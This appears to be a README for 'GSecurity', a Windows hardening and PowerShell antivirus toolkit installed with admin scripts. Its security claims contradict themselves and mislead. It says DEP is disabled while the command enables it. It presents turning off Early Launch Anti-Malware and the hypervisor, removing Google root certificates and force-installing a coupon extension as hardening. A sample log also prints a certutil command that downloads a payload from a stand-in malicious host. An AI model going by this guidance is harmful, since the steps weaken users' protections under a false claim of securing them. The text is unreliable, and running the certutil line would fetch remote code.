<div align="center">

# 🛡️ GSecurity

### Enterprise-Grade Windows Security Hardening Toolkit

[![Version](https://img.shields.io/badge/version-6.0.0-blue.svg)](https://github.com/yourusername/gsecurity)
[![Last Updated](https://img.shields.io/badge/updated-June%202025-green.svg)](https://github.com/yourusername/gsecurity)
[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)
[![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-blue.svg)](https://github.com/PowerShell/PowerShell)
[![Windows](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey.svg)](https://www.microsoft.com/windows)

*Comprehensive system hardening, threat detection, and security automation for Windows environments*

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Components](#-components) • [Configuration](#%EF%B8%8F-configuration) • [Security](#-security-considerations)

</div>

---

## 📋 Overview

**GSecurity** is a production-ready security hardening framework designed for Windows 10/11 systems. It provides automated threat detection, malware scanning, behavioral analysis, and comprehensive system lockdown capabilities through a modular architecture.

### Key Capabilities

- 🔍 **Real-time Threat Detection** - Advanced EDR with behavioral analysis
- 🧬 **Multi-vector Scanning** - Hash-based, entropy analysis, and signature detection
- 🚫 **Living-off-the-Land Binary (LOLBin) Detection** - Monitors abuse of legitimate Windows tools
- 🌐 **DNS-over-HTTPS (DoH)** - Encrypted DNS configuration for all network adapters
- 🔐 **System Hardening** - BIOS tweaks, service lockdown, and privilege restrictions
- 🌍 **Browser Security** - Automated installation of privacy extensions (uBlock Origin, etc.)
- 📊 **Comprehensive Logging** - Event logging with integrity verification

---

## ✨ Features

### Core Security Components

| Component | Description | Status |
|-----------|-------------|--------|
| **Antivirus Engine** | Production-hardened EDR with 20+ detection modules | ✅ Active |
| **Hash Detection** | MD5/SHA256 signature matching with entropy analysis | ✅ Active |
| **LOLBin Detection** | Monitors certutil, mshta, regsvr32, wmic abuse | ✅ Active |
| **Credential Dumping** | Detects mimikatz, procdump, lsass access attempts | ✅ Active |
| **Ransomware Protection** | Behavioral analysis for rapid encryption patterns | ✅ Active |
| **Process Anomaly Detection** | Identifies suspicious process injection & hollowing | ✅ Active |
| **Network Monitoring** | DNS exfiltration, named pipes, and anomaly detection | ✅ Active |
| **Registry Persistence** | Scans Run keys, WMI, scheduled tasks for persistence | ✅ Active |

### System Hardening Features

- **BIOS/Boot Configuration**: Disables hypervisor, DEP, TPM boot entropy, and other attack vectors via `bcdedit`
- **Service Lockdown**: Automatically disables risky services (VNC, TeamViewer, Telnet, FTP, WinRM, etc.)
- **Network Security**: Forces DNS-over-HTTPS with Cloudflare (1.1.1.1) and Google (8.8.8.8)
- **Permission Hardening**: Restricts UAC, file system permissions, and removes default users
- **Certificate Management**: Removes untrusted/Chinese root certificates from the system store
- **Browser Policies**: Enforces extension installations and privacy settings across Chrome, Firefox, Edge, Brave, Vivaldi, Arc, and Zen

---

## 🚀 Installation

### Prerequisites

- **Windows 10/11** (64-bit)
- **PowerShell 5.1+** with Administrator privileges
- **.NET Framework 4.7.2+**

### Quick Install

1. **Download the latest release**
   ```powershell
   # Clone the repository
   git clone https://github.com/yourusername/gsecurity.git
   cd gsecurity
   ```

2. **Run the main installer**
   ```cmd
   # Run as Administrator
   SetupComplete.cmd
   ```

   The installer will:
   - Create installation directory at `C:\Windows\Setup\Scripts`
   - Execute PowerShell, CMD, and Registry scripts in order
   - Apply BIOS/boot hardening
   - Configure network security
   - Install antivirus engine
   - Schedule startup tasks
   - Restart the system

### Manual Installation

```powershell
# Copy scripts to installation directory
xcopy /E /I /Y .\Bin C:\Windows\Setup\Scripts\Bin

# Execute individual components
cd C:\Windows\Setup\Scripts\Bin
powershell.exe -ExecutionPolicy Bypass -File Antivirus.ps1
GSecurity.cmd
reg import GSecurity.reg
```

---

## 📦 Components

### 1. **SetupComplete.cmd** (Main Orchestrator)
- Elevates privileges automatically
- Executes all scripts in alphabetical order (.ps1 → .cmd → .reg)
- Coordinates installation flow

### 2. **Antivirus.ps1** (EDR Engine)
**1,200+ lines of production PowerShell**

Key Modules:
- `Invoke-HashDetection`: MD5/SHA256 scanning with entropy analysis (7.2+ threshold)
- `Invoke-LOLBinDetection`: Monitors certutil, mshta, regsvr32, wmic, rundll32 abuse
- `Invoke-CredentialDumpDetection`: Detects lsass.exe access, mimikatz, procdump
- `Invoke-RansomwareDetection`: Monitors rapid file encryption patterns
- `Invoke-ProcessAnomalyDetection`: Identifies code injection, process hollowing
- `Invoke-NetworkAnomalyDetection`: DNS tunneling, named pipes, suspicious connections
- `Invoke-RegistryPersistenceDetection`: Scans Run keys, WMI, scheduled tasks

**Auto-Actions**:
- Quarantine threats to `C:\ProgramData\AntivirusProtection\Quarantine`
- Terminate malicious processes with termination retry logic
- Log to Windows Event Log + file system with HMAC integrity
- Cache file hashes for performance (10,000 entry limit)

### 3. **GSecurity.cmd** (BIOS & Boot Hardening)
```cmd
bcdedit /set nx AlwaysOn            # Enable DEP
bcdedit /set hypervisorlaunchtype off # Disable Hyper-V
bcdedit /set disableelamdrivers Yes  # Disable Early Launch Anti-Malware
bcdedit /set useplatformclock false  # Disable platform clock for gaming performance
```

### 4. **GSecurity.bat** (Network & Service Lockdown)
- **DNS-over-HTTPS**: Configures all network adapters (including offline) with DoH templates
- **Service Disabling**: VNC, FileZilla, TeamViewer, AnyDesk, Telnet, SSH, WinRM, SMB
- **User Cleanup**: Removes `defaultuser0` account
- **UAC Configuration**: Sets ConsentPromptBehaviorAdmin to 5 (prompt for credentials)

### 5. **GSecurity.reg** (Browser Policies & Certificates)
- **Browser Extensions** (forced install):
  - uBlock Origin (`cjpalhdlnbpafiamejdnhcphjbkeiagm`)
  - Return YouTube Dislike (`gebbhagfogifgggkldgodflihgfeippi`)
  - I Don't Care About Cookies (`jid1-KKzOGWgsW3Ao4Q@jetpack`)
  - Cently Coupons (`cently@couponfollow.com`)
  - Cookie AutoDelete (`jfnangjojcioomickmmnfmiadkfhcdmd`)
  
- **Certificate Removal**: Untrusted roots (Google certs, Chinese authorities, etc.)

### 6. **Antivirus.xml** (Task Scheduler)
- Launches `Antivirus.ps1` at user logon
- Runs as S-1-5-21 user (least privilege)
- Hidden execution with automatic restart on failure

---

## ⚙️ Configuration

### Antivirus Engine Settings
Edit `Antivirus.ps1` configuration block:

```powershell
$Config = @{
    # Core Features
    AutoKillThreats = $true              # Terminate malicious processes
    AutoQuarantine = $true               # Move threats to quarantine
    EnableDatabaseIntegrity = $true      # HMAC verification
    
    # Detection Modules (toggle individually)
    EnableHashDetection = $true
    EnableLOLBinDetection = $true
    EnableCredentialDumpDetection = $true
    EnableRansomwareDetection = $true
    EnableProcessAnomalyDetection = $true
    EnableNetworkAnomalyDetection = $true
    EnableRegistryPersistenceDetection = $true
    
    # Performance
    MaxMemoryUsageMB = 500
    CacheExpirationHours = 24
    LogRotationDays = 30
}
```

### Scan Intervals
```powershell
$Script:ManagedJobConfig = @{
    MalwareScanIntervalSeconds = 15
    CredentialDumpingIntervalSeconds = 15
    RansomwareBehaviorIntervalSeconds = 15
    NetworkAnomalyIntervalSeconds = 30
    RegistryPersistenceIntervalSeconds = 120
    ScheduledTaskIntervalSeconds = 120
}
```

### Whitelist Management
```powershell
# Add trusted process to whitelist
Add-ToWhitelist -ProcessName "TrustedApp.exe" -Reason "Corporate tool" -Category "Approved"

# Remove from whitelist
Remove-FromWhitelist -Identifier "TrustedApp.exe"
```

---

## 🔍 Usage

### Running the Antivirus
```powershell
# Start protection
powershell.exe -ExecutionPolicy Bypass -File "C:\ProgramData\AntivirusProtection\Antivirus.ps1"

# Uninstall
powershell.exe -ExecutionPolicy Bypass -File Antivirus.ps1 -Uninstall
```

### Checking Status
```powershell
# View logs
Get-Content "C:\ProgramData\AntivirusProtection\Logs\antivirus_log.txt" -Tail 50

# Check quarantine
Get-ChildItem "C:\ProgramData\AntivirusProtection\Quarantine"

# View Windows Event Logs
Get-EventLog -LogName Application -Source "MalwareDetector" -Newest 20
```

### Network Configuration
```cmd
# Verify DNS-over-HTTPS
netsh interface ipv4 show dnsservers

# Check DoH registry keys
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DohSettings"
```

---

## 🛡️ Security Considerations

### ⚠️ Important Warnings

1. **Service Disruption**: This toolkit disables critical remote access services (RDP alternatives, file servers, remote registry). Ensure you have local/physical access before deployment.

2. **Certificate Removal**: Removes 50+ root certificates. May break applications/websites that rely on specific CAs.

3. **Browser Control**: Enforces mandatory extension installation. Users cannot disable or remove policy-managed extensions.

4. **Performance Impact**: Real-time scanning with 15-second intervals may impact system performance on low-end hardware.

### Recommended Use Cases

✅ **Good for:**
- Personal workstations
- Gaming PCs
- Isolated systems
- Privacy-focused setups
- Security research labs

❌ **Not recommended for:**
- Enterprise domain-joined systems (conflicts with Group Policy)
- Servers requiring remote administration
- Systems with custom CA certificates
- Virtualization hosts (Hyper-V, VMware Workstation)

---

## 📊 Threat Detection Examples

### Hash Detection
```
[2025-06-10 14:32:15] [THREAT] CRITICAL: Known malware detected
File: C:\Users\Admin\Downloads\malware.exe
MD5: 44D88612FEA8A8F36DE82E1278ABB02F
SHA256: 275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F
Action: Quarantined
```

### LOLBin Detection
```
[2025-06-10 14:35:42] [THREAT] Detected LOLBin abuse
Process: certutil.exe (PID: 5432)
Command: certutil.exe -urlcache -split -f http://malicious.com/payload.exe
Severity: HIGH
Action: Process terminated
```

### Ransomware Detection
```
[2025-06-10 14:40:18] [THREAT] Ransomware behavior detected
Process: suspicious.exe (PID: 7821)
Behavior: 45 files encrypted in 5 seconds
Target: C:\Users\Admin\Documents\
Action: Process terminated, files quarantined
```

---

## 🗂️ Directory Structure

```
C:\Windows\Setup\Scripts\
├── SetupComplete.cmd          # Main installer
└── Bin\
    ├── Antivirus.ps1          # EDR engine (1,239 lines)
    ├── Antivirus.xml          # Task scheduler config
    ├── GSecurity.cmd          # BIOS hardening
    ├── GSecurity.bat          # Network/service lockdown
    └── GSecurity.reg          # Browser policies (9,139 lines)

C:\ProgramData\AntivirusProtection\
├── Data\
│   ├── database.json          # Threat database
│   ├── whitelist.json         # Approved processes
│   ├── scanned_files.txt      # Cache
│   ├── db_integrity.hmac      # Integrity key
│   └── antivirus.pid          # Process ID
├── Logs\
│   ├── antivirus_log.txt      # Main log
│   └── behavior_detections.log # Threat log
├── Quarantine\               # Isolated threats
└── Reports\                  # Scan reports
```

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Development Guidelines
- PowerShell scripts must pass `PSScriptAnalyzer`
- Test on clean Windows 10/11 VM before submitting
- Update documentation for new features
- Follow existing code style and conventions

---

## 📝 Changelog

### v6.0.0 (June 2025)
- ✨ Complete rewrite of antivirus engine with 20+ detection modules
- 🔐 Added DNS-over-HTTPS support for all network adapters
- 🌐 Expanded browser policy support (Arc, Zen, Vivaldi)
- 🛡️ Enhanced LOLBin detection with 15+ patterns
- 📊 Added HMAC database integrity verification
- ⚡ Implemented 10,000-entry hash cache for performance
- 🎯 Process termination retry logic with max attempts
- 📝 Comprehensive event logging to Windows Event Log

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**Gorstak**

- GitHub: [@gorstak](https://github.com/ads-blocker)
- Last Updated: 2026

---

## ⚖️ Legal Disclaimer

This software is provided for **educational and security research purposes only**. By using GSecurity, you agree to:

- Use it only on systems you own or have explicit permission to modify
- Comply with all applicable laws and regulations
- Accept full responsibility for any consequences arising from its use
- Understand that the authors are not liable for any damages or legal issues

**DO NOT USE ON PRODUCTION SYSTEMS WITHOUT THOROUGH TESTING.**

---

## 🙏 Acknowledgments

- Windows Defender team for inspiration on EDR design
- MITRE ATT&CK framework for threat detection patterns
- uBlock Origin and privacy extension developers
- PowerShell community for best practices

---

<div align="center">

**⭐ If you find this project useful, please consider giving it a star!**

[Report Bug](https://github.com/yourusername/gsecurity/issues) • [Request Feature](https://github.com/yourusername/gsecurity/issues) • [Documentation](https://github.com/yourusername/gsecurity/wiki)

</div>
